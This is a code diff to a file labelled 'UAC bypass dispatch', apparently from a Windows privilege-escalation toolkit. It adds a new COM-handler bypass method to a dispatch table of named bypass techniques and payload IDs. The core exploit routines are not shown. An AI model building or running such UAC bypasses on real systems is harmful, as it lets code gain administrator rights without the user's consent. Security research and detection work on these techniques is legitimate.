@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     2.87
+*  VERSION:     2.88
 *
-*  DATE:        02 May 2018
+*  DATE:        11 May 2018
 *
 *  UAC bypass dispatch.
 *
@@ -59,6 +59,7 @@ UCM_API(MethodDccwCOM);
 UCM_API(MethodVolatileEnv);
 UCM_API(MethodSluiHijack);
 UCM_API(MethodBitlockerRC);
+UCM_API(MethodCOMHandlers2);
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodTest, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
@@ -107,7 +108,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodDccwCOM, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodVolatileEnv, NULL, { 7600, 16229 }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodSluiHijack, NULL, { 9600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodBitlockerRC, NULL, { 7600, 16300 }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }
+    { MethodBitlockerRC, NULL, { 7600, 16300 }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodCOMHandlers2, NULL, { 7600, MAXDWORD }, FUJINAMI_ID, FALSE, TRUE, TRUE }
 };
 
 /*
@@ -874,7 +876,7 @@ UCM_API(MethodCOMHandlers)
         SetLastError(ERROR_INVALID_DATA);
         return FALSE;
     }
-    return ucmMethodCOMHandlers(PayloadCode, PayloadSize);
+    return ucmCOMHandlersMethod(PayloadCode, PayloadSize);
 }
 
 UCM_API(MethodCMLuaUtil)
@@ -988,4 +990,17 @@ UCM_API(MethodBitlockerRC)
         lpszPayload = g_ctx.szOptionalParameter;
 
     return ucmBitlockerRCMethod(lpszPayload);
+}
+
+UCM_API(MethodCOMHandlers2)
+{
+    UNREFERENCED_PARAMETER(Method);
+    UNREFERENCED_PARAMETER(ExtraContext);
+
+    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
+
+    return ucmCOMHandlersMethod2(PayloadCode, PayloadSize);
 }
